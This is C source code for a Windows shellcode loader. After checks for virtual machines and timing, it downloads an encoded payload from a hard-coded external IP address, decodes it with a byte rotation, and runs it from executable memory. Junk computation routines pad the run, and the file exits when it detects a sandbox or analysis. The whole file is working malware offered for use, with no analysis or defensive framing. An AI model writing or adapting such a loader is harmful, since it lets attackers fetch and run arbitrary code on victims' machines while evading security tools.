//gcc -mwindows stub.c -lwininet -lkernel32
#include "Windows.h"
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")

void rot_n(unsigned char *byte, int n);
void foo(long int length);
char* fooString(char* input);
void fooArray(int* arr,long int size);
int fooNumber(long int num);
DWORD WINAPI fooRecursively(LPVOID depthPtr);
char* createRandomString(long int length);
int* createRandomArray(long int length);
int createRandomNumber();
void nDebugging();
void check_virtualized();

// Define the THRESHOLD (you can adjust the value based on your needs)
#define THRESHOLD 30000000000 // 30 seconds in nanoseconds

// Function to get the current time (in nanoseconds on Linux, or ticks on Windows)
uint64_t get_time() {
#ifdef _WIN32
    // Windows: Use QueryPerformanceCounter for high resolution time
    LARGE_INTEGER freq, counter;
    QueryPerformanceFrequency(&freq);   // Get frequency (ticks per second)
    QueryPerformanceCounter(&counter);  // Get current tick count
    return (uint64_t)(counter.QuadPart * 1000000000 / freq.QuadPart);  // Convert to nanoseconds
#else
    // Linux: Use clock_gettime for high resolution time (nanoseconds)
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);  // Get current time
    return (uint64_t)(ts.tv_sec * 1000000000 + ts.tv_nsec);  // Convert to nanoseconds
#endif
}



int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {	
    check_virtualized();
	uint64_t start = get_time();
	long int fooSize = 100000000;
	foo(fooSize);
    const char *url = "http://198.58.127.74/encrypted.bin";
    int rotation_value = 33;
    HINTERNET hInternet = NULL, hConnect = NULL;
    unsigned char *foo_sc = NULL;
    void *exec = NULL;

	foo(fooSize);
    hInternet = InternetOpen("foo", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {goto cleanup;}


    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {goto cleanup;}


    DWORD file_size = 0;
    DWORD bytes_read = 0;
    foo_sc = (unsigned char *)malloc(4096);
    if (foo_sc == NULL) {goto cleanup;}

    unsigned char *current_position = foo_sc;
    DWORD total_size = 0;

	foo(fooSize);
    while (InternetReadFile(hConnect, current_position, 4096, &bytes_read) && bytes_read > 0) {
        total_size += bytes_read;
        current_position += bytes_read;
        unsigned char *temp = (unsigned char *)realloc(foo_sc, total_size + 4096);
        if (temp == NULL) {goto cleanup;}
        foo_sc = temp;
    }
    if (total_size == 0) {goto cleanup;}

	
	foo(fooSize);
    exec = VirtualAlloc(NULL, total_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {goto cleanup;}

	uint64_t end = get_time();
	if( end - start > THRESHOLD ) {
		exit(1);
	}
	
	
    for (DWORD i = 0; i < total_size; i++) {
        rot_n(&foo_sc[i], -rotation_value);  
    }
	foo(fooSize);
    memcpy(exec, foo_sc, total_size);

	foo(fooSize);
    ((void(*)())exec)();

cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    if (foo_sc) free(foo_sc);
    if (exec) VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}

void rot_n(unsigned char *byte, int n) {
    *byte = (*byte + n + 256) % 256;
}

char* fooString(char* input) {
    int length = strlen(input);
    char* output = (char*)malloc(length + 1);
    for (int i = 0; i < length; i++) {
        output[i] = input[i] ^ 0x55;
    }
    output[length] = '\0';
    return output;
}

void fooArray(int* arr, long int size) {
    for (int i = 0; i < size; i++) {
        arr[i] ^= 0xAA;
    }
}

int fooNumber(long int num) {
    return num ^ 0xFF;
}

HANDLE mtx;

DWORD WINAPI fooRecursively(LPVOID depthPtr) {
    long int depth = *(long int*)depthPtr;
    if (depth > 0) {
        WaitForSingleObject(mtx, INFINITE);
        int originalNumber = createRandomNumber();
        int obfuscatedNumber = fooNumber(originalNumber);
        depth--;
        fooRecursively(&depth);
        ReleaseMutex(mtx);
    }
    return 0;
}

char* createRandomString(long int length) {
    char* randomString = (char*)malloc(length + 1);
    srand(time(NULL));
    for (int i = 0; i < length; i++) {
        char randomChar = 'a' + rand() % 26;
        randomString[i] = randomChar;
    }
    randomString[length] = '\0';
    return randomString;
}

int* createRandomArray(long int length) {
    int* randomArray = (int*)malloc(length * sizeof(int));
    srand(time(NULL));
    for (int i = 0; i < length; i++) {
        randomArray[i] = rand() % 100;
    }
    return randomArray;
}

int createRandomNumber() {
    srand(time(NULL));
    return rand() % 1000;
}

void foo(long int length) {
    char* originalString = createRandomString(length);
    char* obfuscatedString = fooString(originalString);
    free(obfuscatedString);

    int* originalArray = createRandomArray(length);
    int size = length;
    fooArray(originalArray, size);
    free(originalArray);

    long int depth = 10000;
    mtx = CreateMutex(NULL, FALSE, NULL);
    HANDLE threadHandle = CreateThread(NULL, 0, fooRecursively, &depth, 0, NULL);
    WaitForSingleObject(threadHandle, INFINITE);
    CloseHandle(threadHandle);
    CloseHandle(mtx);
}

void check_virtualized() {
    unsigned int eax, ebx, ecx, edx;

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0)
    );

    if (ebx == 0x76636F6D && ecx == 0x00000000 && edx == 0x00000000) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000)
    );

    if (eax == 0x40000000) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x80000000)
    );

    if (eax == 0x80000000) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000)
    );

    if (ebx == 0x4B564D20 && ecx == 0x4D564D20 && edx == 0x4B564D20) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000)
    );

    if (ebx == 0x51485056 && ecx == 0x454D5546 && edx == 0x51485056) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000)
    );

    if (ebx == 0x5846504D && ecx == 0x5846504D && edx == 0x5846504D) {
        exit(1);
    }

    __asm__ __volatile__ (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0x40000000)
    );

    if (ebx == 0x50726572 && ecx == 0x206c6163 && edx == 0x74726170) {
        exit(1);
    }
}
